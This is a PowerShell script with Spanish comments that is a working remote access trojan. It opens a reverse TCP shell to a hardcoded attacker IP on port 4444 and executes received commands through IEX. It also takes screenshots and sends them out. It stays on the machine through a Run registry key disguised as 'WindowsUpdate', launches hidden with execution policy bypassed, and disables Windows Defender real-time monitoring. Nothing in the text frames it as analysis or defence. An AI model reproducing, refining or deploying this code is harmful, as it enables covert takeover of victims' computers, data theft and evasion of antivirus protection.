# Configuración
$AttackerIP = "178.156.158.72"  # IP del atacante
$PORT = 4444  # Puerto de escucha
$PERSISTENCE_PATH = "$env:APPDATA\WindowsUpdate.ps1"

# Función para ejecutar comandos
function Invoke-CommandExec {
    param ($cmd)
    return IEX $cmd 2>$null
}

# Agregar persistencia
function Add-Persistence {
    if (-not (Test-Path $PERSISTENCE_PATH)) {
        Copy-Item $PSCommandPath $PERSISTENCE_PATH
        IEX "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d `"powershell -ep bypass -w hidden -f $PERSISTENCE_PATH`" /f" >$null 2>&1
    }
}

# Desactivar Defender
function Disable-Defender {
    IEX "powershell -ep bypass -c `"Set-MpPreference -DisableRealtimeMonitoring `$true`"" >$null 2>&1
}

# Capturar pantalla
function Capture-Screen {
    param ($client)
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $ms = New-Object IO.MemoryStream
    $bitmap.Save($ms, "png")
    $client.Write($ms.ToArray())
    $ms.Close()
}

# Conexión y manejo
function Connect-And-Handle {
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient($AttackerIP, $PORT)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            while ($true) {
                $cmd = $reader.ReadLine()
                if ($cmd -eq "exit") { break }
                elseif ($cmd -eq "screenshot") {
                    Capture-Screen -client $stream
                }
                else {
                    $result = Invoke-CommandExec $cmd
                    $writer.WriteLine($result)
                    $writer.Flush()
                }
            }
            $client.Close()
        }
        catch {
            Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 10)
        }
    }
}

# Iniciar
Add-Persistence
Disable-Defender
Connect-And-Handle